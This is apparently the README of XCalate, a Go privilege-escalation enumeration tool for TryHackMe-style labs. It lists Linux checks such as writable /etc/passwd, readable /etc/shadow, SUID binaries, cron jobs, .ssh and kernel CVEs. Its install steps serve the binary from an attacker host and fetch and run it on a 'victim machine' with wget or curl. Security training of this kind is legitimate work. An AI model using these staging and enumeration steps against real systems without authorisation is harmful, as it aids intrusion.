# 🚀 XCalate
A privilege escalation tools based on TryHackMe.

Run simple check (not thorough) for possible vector of privilege escalation.

# ⚙️ Installation

>Tested with go version go1.24.0
1. `git clone https://github.com/7imbitz/XCalate.git`
2. `cd XCalate`
_Build_
3. Send `uname -m` command inside target

<div align="center">
|`uname -m`| Meaning | `GOARCH`| Command |
|---|---|---|---|
|x86_64, amd64|64-bit Intel/AMD| `amd64`| `env CGO_ENABLED=0 GOOS=linux GOARCH=amd64 go build -o XCalate cmd/main.go`|
|i686, i386|32-bit x86|`386`| `env CGO_ENABLED=0 GOOS=linux GOARCH=386 go build -o XCalate cmd/main.go`|
|aarch64|64-bit ARM|`arm64`| `env CGO_ENABLED=0 GOOS=linux GOARCH=arm64 go build -o XCalate cmd/main.go`|
|armv7l, armv6l|32-bit ARM|`arm`| `env CGO_ENABLED=0 GOOS=linux GOARCH=arm go build -o XCalate cmd/main.go`|
</div>

4. Transfer the binary to the victim machine

```bash
#host
sudo python3 -m http.server 80 
#victim
`wget 10.10.10.10/XCalate` OR `curl http://10.10.10.10/XCalate -o XCalate`
chmod +x XCalate
./XCalate
```

# 📋 Checklist

In the meantime it checks for 
- Linux
    - ✅ Possible Service Exploits
    - ✅ Weak File Permissions
        - ✅ /etc/shadow - Readable & Writable
        - ✅ /etc/passwd - Writable
    - ✅ Sudo - Shell Escape Sequences
    - ✅ SUID Executable
    - ✅ [Capability](https://www.hackingarticles.in/linux-privilege-escalation-using-capabilities/)
    - ✅ Cron Jobs
        - ✅ Overwrite custom cronjob - Writable
        - ✅ Check user's path inside the file
        - ✅ Usage of wildcards in cronjob
    - ✅ History
    - ✅ .ssh
    - ✅ kernel check for 
        - ✅ CVE-2021-3493
        - ✅ CVE-2022-0847
        - To be added

- Window
    - To be continued...


# 📖 Reference

- https://tryhackme.com/r/room/linuxprivesc
    - https://tryhackme.com/7imbitz/badges/linux-privesc     
- https://tryhackme.com/r/room/windows10privesc